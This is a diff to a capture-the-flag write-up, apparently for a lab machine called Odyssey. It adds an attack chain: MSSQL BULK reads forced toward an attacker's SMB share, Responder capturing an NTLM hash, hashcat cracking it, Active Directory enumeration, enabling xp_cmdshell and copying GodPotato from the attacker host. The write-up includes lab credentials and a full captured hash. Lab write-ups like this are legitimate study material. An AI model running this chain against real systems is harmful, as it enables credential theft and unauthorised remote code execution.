@@ -1431,48 +1431,10 @@ getent group sudo
 # sudo:x:27:webadmin
 
 sudo su
+# i tried both password one of them it work starting with op...
 id
 # uid=0(root) gid=0(root) groups=0(root)
-# i used the same password it works so now we can have ssh access because the SSH is running 
-tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*
-```
-{% endcode %}
-
-{% code overflow="wrap" %}
-```bash
-ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
-nano ssh.key # on kali
-chmod 600 ssh.key
-ssh -i ssh.key root@10.129.47.110
-```
-{% endcode %}
-
-**it doesnt work i dont know why we cant ssh to target since its enabled and its running  we hit it the firewall block the ssh**&#x20;
-
-{% code overflow="wrap" %}
-```bash
-ufw status
-
-Status: active
-
-To                         Action      From
---                         ------      ----
-Anywhere on lo             ALLOW       Anywhere
-3000/tcp                   ALLOW       Anywhere                   # AEGIS web app — only port reachable from outside
-Anywhere (v6) on lo        ALLOW       Anywhere (v6)
-3000/tcp (v6)              ALLOW       Anywhere (v6)              # AEGIS web app — only port reachable from outside
-
-```
-{% endcode %}
-
-**It allow just the 3000 port, am dump because i forget that in the first scan i receive hist the 3000 open**
-
-{% code overflow="wrap" %}
-```bash
-ufw allow 22/tcp
-ufw reload
-
-# but it doesnt work also 
+# i used the same password it works
 ```
 {% endcode %}
 
@@ -1602,5 +1564,94 @@ server           ADMINISTER BULK OPERATIONS
 server           VIEW ANY DATABASE                                                                                                                                                                                                                                                 
 
 # its interesting we have bulk permissions we can read local files
+```
+{% endcode %}
+
+**so the idea is that we can insert using BULK insert let's try to catch soemthing on responder**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "
+SELECT * FROM OPENROWSET(BULK '\\\\10.10.14.92\\share\\test.txt', SINGLE_CLOB) AS x;
+
+sudo responder -I tun0 -dwv
+svc-mssql::ODYSSEY:29eac9a020e28f50:CE4FB05785802B62E2F647D322A78612:010100000000000000AE8537A50BDD013BE953ACC25D31480000000002000800390045004700350001001E00570049004E002D005500470034005200330048005300310032004300460004003400570049004E002D00550047003400520033004800530031003200430046002E0039004500470035002E004C004F00430041004C000300140039004500470035002E004C004F00430041004C000500140039004500470035002E004C004F00430041004C000700080000AE8537A50BDD01060004000200000008005000500000000000000000000000003000009DE8AA27D69CE54F4178670BD79685E4A156FFB5D3D382ADB764197BACFCC94238322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000
+```
+{% endcode %}
+
+**Trying to crack it and its cracked**
+
+{% code overflow="wrap" %}
+```bash
+cat > svc_mssql.hash << 'EOF'                                                                                           svc-mssql::ODYSSEY:29eac9a020e28f50:CE4FB05785802B62E2F647D322A78612:010100000000000000AE8537A50BDD013BE953ACC25D31480000000002000800390045004700350001001E00570049004E002D005500470034005200330048005300310032004300460004003400570049004E002D00550047003400520033004800530031003200430046002E0039004500470035002E004C004F00430041004C000300140039004500470035002E004C004F00430041004C000500140039004500470035002E004C004F00430041004C000700080000AE8537A50BDD01060004000200000008005000500000000000000000000000003000009DE8AA27D69CE54F4178670BD79685E4A156FFB5D3D382ADB764197BACFCC94238322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000
+EOF
+
+hashcat -m 5600 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force
+# svc_mssql:cml958782
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 10**</mark>&#x20;
+
+**Let's now test this creds on AD**
+
+{% code overflow="wrap" %}
+```bash
+nxc smb $ip --generate-hosts-file hosts
+cat hosts | tee -a /etc/hosts
+
+nxc smb $ip --generate-krb5-file krb5
+cp krb5 /etc/krb5.conf
+
+echo $pass | KRB5CCNAME=/tmp/krb5cc_mssql kinit  svc-mssql@ODYSSEY.HTB
+export KRB5CCNAME=/tmp/krb5cc_mssql
+
+fake_dc $dc nxc smb $ip -u $user -p $pass
+# SMB         172.16.0.10     445    DC01             [+] odyssey.htb\svc-mssql:cml958782
+
+fake_dc $dc bloodhound-python -c all -u $user -p $pass -d $domain -ns $ip --zip
+
+# Nothing interesting on Bloodhound
+
+fake_dc $dc bloodyAD --host $dc -d ODYSSEY.HTB -u $user -p $pass get writable
+
+# Nothing interesting here also 
+
+fake_dc $dc certipy-ad find -u $user -p $pass -dc-ip $ip  --dns-tcp -vulnerable -stdout
+# nothing also
+```
+{% endcode %}
+
+**No shares no anything interesting i enumarate everything the last things having a shell with this SQL server user it can be sysadmin**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+nxc mssql 172.16.0.11 -u svc-mssql -p 'cml958782' -d odyssey.htb
+# MSSQL       172.16.0.11     1433   ODYSSEY-DB       [+] odyssey.htb\svc-mssql:cml958782 (Pwn3d!)
+```
+{% endcode %}
+
+**It's local admin we see his privs i already deal with that GodPotato if he has Impersonate Privs**
+
+{% code overflow="wrap" %}
+```bash
+nxc mssql 172.16.0.11 -u svc-mssql -p 'cml958782' -d odyssey.htb -x 'whoami /priv'
+# MSSQL       172.16.0.11     1433   ODYSSEY-DB       SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+```
+{% endcode %}
+
+**I tried to send God-Potato and execute Commands using nxc but it fails howver we will do it with impacket**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+impacket-mssqlclient 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'net use Z: \\10.10.14.92\share /user:user pass';
+
+# On kali
+impacket-smbserver share $(pwd) -smb2support -user user -password pass
+
+EXEC xp_cmdshell 'copy \\10.10.14.92\share\GodPotato-NET4.exe C:\Users\svc-mssql\Desktop\gp.exe';
+# Operation did not complete successfully because the file contains a virus or potentially unwanted software.
 ```
 {% endcode %}
